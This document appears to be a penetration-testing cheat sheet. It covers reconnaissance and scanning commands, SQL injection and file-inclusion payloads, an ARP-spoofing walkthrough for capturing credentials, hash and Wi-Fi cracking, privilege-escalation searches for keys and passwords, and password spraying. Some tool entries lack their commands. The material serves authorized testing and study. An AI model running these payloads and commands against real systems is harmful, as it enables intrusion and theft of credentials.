Tools

Whois Domain ownership info
Tool purpose: Get ownership, registrar, IP/netblock details from WHOIS services.
whois domain.com
Get domain registrar, IP ranges.
whois <IP>
Find who owns an IP/netblock.
whois -h whois.arin.net <IP>
Query ARIN specifically (North America).
Amass / Subfinder Subdomain enumeration
Tool purpose: Discover subdomains using both passive (amass, subfinder) and active techniques.
amass enum -d domain.com -o recon/amass.txt
Deep passive/active subdomains.
subfinder -d domain.com -o recon/subfinder.txt
Fast subdomain discovery.
TheHarvester Emails & subdomains
Tool purpose: Gather emails, subdomains, and hosts from public sources like search engines.
theHarvester -d domain.com -b google -l 200
Collect emails, hosts via Google.
theHarvester -d domain.com -b bing
Collect via Bing search.
Dig / Host / Nslookup DNS lookups
Tool purpose: Perform DNS and reverse lookups, query records, and test for zone transfers.
dig +short domain.com
Get A record (IP address).
dig -x <IP>
Reverse lookup (IP → domain).
dig mx domain.com
Get mail servers.
host domain.com
Quick DNS lookup.
dig axfr @ns1.domain.com domain.com
Attempt zone transfer.
nslookup domain.com
Quick DNS lookup (Windows).
nslookup -type=MX domain.com
Get mail servers (Windows).
Nmap Host Discovery
Tool purpose: Discover live hosts on a network before port scanning.
sudo nmap -PR -sn 192.168.1.0/24
ARP Scan (Best for LAN, fastest & most reliable).
sudo nmap -PE -sn 192.168.1.0/24
ICMP Echo (Normal ping, works if not blocked).
sudo nmap -PP -sn 192.168.1.0/24
ICMP Timestamp (Bypass some ping filters).
sudo nmap -PM -sn 192.168.1.0/24
ICMP Address Mask (Rare, but can reveal devices).
sudo nmap -PS22,80,443 -sn 192.168.1.0/30
TCP SYN Ping (When ICMP is blocked, knock on common ports).
sudo nmap -PA22,80,443 -sn 192.168.1.0/30
TCP ACK Ping (Detects hosts via RST replies).
sudo nmap -PU53,161,162 -sn 192.168.1.0/30
UDP Ping (Useful for DNS/SNMP services).
Extra Options:
-sn
Host discovery only (no port scan).
-n
Skip DNS lookup (faster).
-R
Force reverse-DNS lookup.
Nmap Basic Port Scans
Tool purpose: Identify open TCP/UDP ports and running services on a live host.
nmap -sT <target>
TCP Connect Scan (no root, basic open port check).
sudo nmap -sS <target>
TCP SYN Scan (half-open, stealthy, needs sudo).
sudo nmap -sU <target>
UDP Scan (slow, noisy, needs sudo).
sudo nmap -p 22,80,443 <target>
Scan specific ports (common services, faster than full scan).
sudo nmap -p 1-65535 <target>
Scan all ports (full enumeration, slow).
sudo nmap -p- <target>
Scan all ports (shorthand for 1-65535).
nmap -p 10000-65535 <target>
To scan a range beyond 1000.
sudo nmap -sU -p 10000-65535 <target>
To scan a UDP range beyond 1000.
Nmap Version / OS / Scripts
Tool purpose: Identify service versions, operating system, and run NSE scripts on a target.
sudo nmap -sS -sV -p <ports> <target>
Service/version detection.
sudo nmap -O <target>
OS detection (needs privileges).
sudo nmap -A <target>
Aggressive: -sV -O + default scripts.
sudo nmap --script=banner,vuln -p <ports> <target>
Run specific NSE scripts.
nmap -sV -T4 -sC -p22 <target-ip>
Investigates a specific port for version info and weaknesses.
Extra Options:
-sV
Detects the version of the service running.
-sC
Runs default scripts to find more details.
-T4
Uses an aggressive timing template to scan faster.
Nmap Performance & Discovery
Tool purpose: Adjust scan speed, timing, and discovery options to optimize performance or bypass filters.
sudo nmap -T4 <target>
Faster timing for labs.
sudo nmap -T0 <target>
Paranoid timing (slow).
sudo nmap --min-parallelism=64 <target>
Increase parallel probes (speed up scan, more aggressive).
sudo nmap -Pn <target>
Skip host discovery (treat as up).
sudo nmap --top-ports 100 <target>
Scan top 100 common ports.
Nmap Output
Tool purpose: Save scan results in different formats for reporting, analysis, or future reference.
sudo nmap -oN output.txt <target>
Normal text output.
sudo nmap -oA recon/target <target>
Save all formats (Nmap, XML, grepable).

Ping Basic connectivity checks
Tool purpose: Identify live hosts and perform basic connectivity checks using ICMP packets.
ping -c 4 <IP>
Send 4 ICMP packets (basic connectivity test).
ping -i 2 <IP>
Wait 2 seconds between packets (reduce noise).
ping -s 100 <IP>
Send 100-byte packets (test MTU & fragmentation).
ping -t <IP>
(Windows) Continuous ping until stopped (Ctrl+C).
ping -a <IP>
(Windows) Attempt reverse DNS (IP → hostname).
ping6 <IPv6>
Test connectivity to IPv6 hosts.
Fping Fast ICMP sweeps
Tool purpose: Perform fast ICMP sweeps to discover live hosts across network ranges.

Ping sweep a network with responsive hosts listed.

Read targets from file for bulk checks.

Report statistics and set timeout in ms.
Arp-scan Discover local hosts
Tool purpose: Discover hosts on the local Ethernet broadcast domain using ARP requests.

Discover live hosts on the local broadcast domain.
sudo arp-scan -I eth0 192.168.1.0/24
Specify interface and subnet for precise scans.

Tool purpose: Craft custom packets for probing, firewall testing, and stealthy network scans.

Send SYN packets to test TCP port reachability.

ICMP ping with hping3 for network probing.

Port scan using crafted packets.
Traceroute / Tracert Map network hops
Tool purpose: Map the network hops and measure latency to a target host.
traceroute example.com
Discover network path and hops to a host.
traceroute -I example.com
Use ICMP instead of UDP packets.

Reduce wait and probe count for faster output.

Windows equivalent to traceroute.

Tool purpose: Provide continuous route and latency monitoring for stability analysis.

Run one-time MTR report to analyze routes.

Generate report with specific count for statistics.

Exiftool Extract file metadata
Tool purpose: Extract, view, and edit metadata from files for OSINT and enumeration.

Attacks

SQL Injection
Exploiting a web application's database layer by injecting malicious SQL queries.
username=admin' OR '1'='1
Login Bypass: Put payload in login form fields to log in without a password.
?id=1' UNION SELECT @@version--
Extract Database Version: Put payload in a URL parameter to show the database version.
?id=1' UNION SELECT table_name, NULL FROM information_schema.tables--
List All Tables: Dumps table names from the database.
?id=1' OR IF(1=1, SLEEP(5), 0)--
Time-Based Blind: If the page delays by 5 seconds, SQL injection is confirmed.
File Inclusion (LFI/RFI)
Forcing a web application to include a local or remote file that it was not intended to.
http://webapp.thm/get.php?file=../../../../etc/passwd
Example of Local File Inclusion (LFI) to read a sensitive system file.
Cross-Site Scripting (XSS)
Injecting malicious scripts into trusted websites, which then execute in a victim's browser.

Stored XSS (Persistent)

Payload is saved on the server (e.g., in a comment section or profile) and triggers whenever a victim loads that page.

Reflected XSS (Non-persistent)

Payload is injected in the request (e.g., URL search parameter) and immediately reflected back in the response.

DOM-Based XSS

Payload is executed on the client-side (browser) due to insecure JavaScript code manipulating the DOM, with no server-side reflection needed.

Race Condition
Exploiting a timing flaw where the system's behavior depends on the sequence or timing of uncontrollable events.

A timing attack where an attacker sends multiple parallel requests to exploit the small window of time before a system updates its state.

Example (Coupon Abuse): Send parallel "apply coupon" requests to reuse a single-use discount code multiple times before the server can invalidate it.

ARP Spoofing Walkthrough (MITM)
A step-by-step guide to performing a Man-in-the-Middle attack on a local network.
  1. Identify Targets: Find victim and gateway IP addresses.
    nmap -sn 192.168.1.0/24
  2. Enable IP Forwarding: Allow traffic to flow through the attacker's machine.
    echo 1 > /proc/sys/net/ipv4/ip_forward
  3. Launch ARP Spoofing: Poison the ARP cache of the victim and gateway.
    arpspoof -i eth0 -t <victim_IP> <gateway_IP>
  4. Sniff Traffic: Use tools like Wireshark or bettercap to capture credentials, cookies, and hashes.
    bettercap > net.sniff on
  5. Restore Network (Cleanup): Stop the tools to allow the network to return to normal. Manually restore with `arping` if needed.
Purpose: Escalate privileges and move laterally inside the network.

Hash Cracking

John the Ripper (JTR) Password cracker
Tool purpose: A fast, flexible, and versatile password cracker that supports many hash types.
john --wordlist=rockyou.txt hashes.txt
Cracks hashes from a file using a wordlist.
john --show hashes.txt
Shows successfully cracked passwords from a session.
unshadow passwd shadow > unshadowed.txt
Merges /etc/passwd and /etc/shadow for cracking.
Hashcat GPU-accelerated cracker
Tool purpose: The world's fastest password cracker, using GPU acceleration to crack hashes from a file.
hashcat -m 0 -a 0 hashes.txt rockyou.txt
Cracks MD5 hashes (-m 0) using a wordlist (-a 0).
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a
Cracks NTLM hashes (-m 1000) with a brute-force attack (-a 3).
hashcat --show hashes.txt
Shows cracked passwords from the session.

Wi-Fi Cracking

Aircrack-ng WPA/WPA2 password recovery
Tool purpose: A suite of tools for assessing Wi-Fi network security, including packet sniffing and cracking.
airmon-ng check kill
Kills processes that interfere with monitor mode.
airmon-ng start wlan0
Puts wireless adapter into monitor mode.
airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon
Captures handshake for a specific Wi-Fi network.
aireplay-ng --deauth 5 -a <bssid> wlan0mon
Deauthenticates a client to force a new handshake capture.
aircrack-ng -w wordlist.txt capture-01.cap
Cracks the captured handshake using a wordlist.
Reaver WPS brute-force attack
Tool purpose: Bruteforces the Wi-Fi Protected Setup (WPS) PIN to retrieve the WPA/WPA2 passphrase.
reaver -i wlan0mon -b <bssid> -vv
Initiates a WPS brute-force attack on a target BSSID.
reaver -i wlan0mon -b <bssid> -p 12345678
Tests a specific WPS PIN.
Wifite Automated Wi-Fi attacks
Tool purpose: An automated tool that simplifies multiple Wi-Fi attack methods, including WPA, WEP, and WPS.
wifite
Starts Wifite and automatically finds and attacks WPA/WPS networks.
wifite --wps --wpa
Only targets networks with WPS enabled or WPA handshakes.

Privilege Escalation

GTFOBins / LOLBAS Misconfigured binaries
Tool purpose: Find and exploit common binaries and scripts with misconfigurations to escalate privileges.
find / -perm -u=s -type f 2>/dev/null
Find all files with the **SUID** bit set to identify potential privilege escalation vectors on Linux.
sudo -l
List all commands the current user can run with sudo, often leading to a root shell.
getcap -r / 2>/dev/null
Find files with special capabilities that can be abused for privilege escalation.
Credential & Misconfiguration Tricks Exploiting system files
Tool purpose: Use a variety of commands to find sensitive information and misconfigurations that lead to privilege escalation.
cat /etc/passwd
Examine the file for user accounts with no passwords or unusual configurations.
cat /etc/shadow
Read the file to check for weak password hashes that can be cracked offline. (Requires elevated privileges.)
find / -type f -name id_rsa 2>/dev/null
Search for SSH private keys on the system, which can provide access to other users or hosts.
grep 'password' /var/www/html/config.php
Search for hardcoded credentials in application configuration files.
ls -la /var/backups
Check for readable backup files that may contain sensitive data or credentials.
grep -RIn --binary-files=without-match 'password\|passwd\|secret' /etc /var/www 2>/dev/null
Recursively search common configuration and web directories for likely credential keywords — quick way to find leaked secrets in configs and app files.
ls -laA /home/*/.ssh 2>/dev/null
List SSH-related files and permissions in user home directories to find keys, authorized_keys, or misconfigured permissions.
strings /usr/bin/* 2>/dev/null | grep -Ei 'password|passwd|ssh|token|key'
Search binaries and scripts for readable strings that may include credentials, tokens, or hints (no guarantee but sometimes useful).
lsof -nP 2>/dev/null | grep -E 'deleted|/tmp|/var/tmp'
Find open file descriptors pointing to deleted or temporary files — sensitive data can remain accessible via file descriptors even after deletion.
find / -type f -name '*.bak' -o -name '*~' -o -name '*.old' 2>/dev/null
Locate backup or old copies of configuration files and scripts which may contain credentials or tokens left in plaintext.
Sudo & Policy Checks Sudo misconfigs & environment
Tool purpose: Check sudoers, environment, and common sudo misconfigurations that allow privilege escalation.
sudo -l -U $(whoami)
Explicitly list sudo privileges for the current user (shows NOPASSWD entries and allowed commands).
getent group sudo && getent group wheel
Check which users belong to common admin groups (sudo/wheel).
env | sort
Inspect environment variables that can sometimes be abused by misconfigured sudo rules (PATH, LD_PRELOAD, etc.).
sudo -V
Show sudo version and build options — useful to identify older vulnerable versions or specific behavior.
Cron Jobs, Services & Scheduled Tasks Persistence & mis-scheduled tasks
Tool purpose: Find scheduled tasks, world-writable scripts, and service misconfigurations that enable privilege escalation or persistence.
ls -la /etc/cron* /var/spool/cron /etc/cron.d 2>/dev/null
List cron locations to find scripts or jobs run as root that reference writable files.
find / -perm -2 -type f -exec ls -la {} \; 2>/dev/null | head -n 50
Find world-writable files (and view permissions) — writable scripts run by root are a common escalation vector.
systemctl list-unit-files --type=service --state=enabled
List enabled services — check service files for ExecStart pointing to writable paths or scripts.
ps aux --no-heading --sort=start_time | head -n 20
Spot recently started processes that may reveal scheduled tasks, wrappers, or injected processes.

Password Spraying

Medusa Password spraying tool
Tool purpose: A brute-force password spraying tool that can be used to test for a few common passwords against many accounts.
medusa -U users.txt -p 'Spring2024!' -h 10.0.0.1 -M ssh
Sprays a single password against a list of users on an SSH service.
medusa -u user1 -P pass_file.txt -h 10.0.0.1 -M http
Brute-forces a single user with a list of passwords via HTTP.
Kerbrute Kerberos brute force
Tool purpose: A tool for brute-forcing and password spraying Kerberos pre-authentication in Active Directory.
kerbrute userenum --dc domain.com -d <ip> users.txt
Enumerates valid usernames against a domain controller.
kerbrute passwordspray --dc domain.com -d <ip> users.txt 'Welcome1!'
Sprays a single password against a list of usernames.

Wordlist Creation

CeWL Web crawler wordlist generator
Tool purpose: Crawls a website to generate a custom wordlist from its content.
cewl http://example.com -w wordlist.txt
Crawls a URL and generates a wordlist.
cewl http://example.com -d 3 -m 5 -w wordlist.txt
Set crawl depth to 3 and minimum word length to 5.
cewl http://example.com --email_file emails.txt
Extracts email addresses found on the website.
Crunch Pattern-based wordlist generator
Tool purpose: Generates wordlists based on specific patterns, character sets, and length constraints.
crunch 4 6 -o wordlist.txt
Generate all possible passwords from 4 to 6 characters long using default characters.
crunch 8 8 -t @@god@@ -o wordlist.txt
Generate a wordlist of 8 characters, with 'god' in the middle, and varying characters around it.
crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric-symbol-space -o wordlist.txt
Generate an 8-character wordlist using a specific character set.
crunch 10 12 -p apple banana password
Create a wordlist by permuting a given set of words.
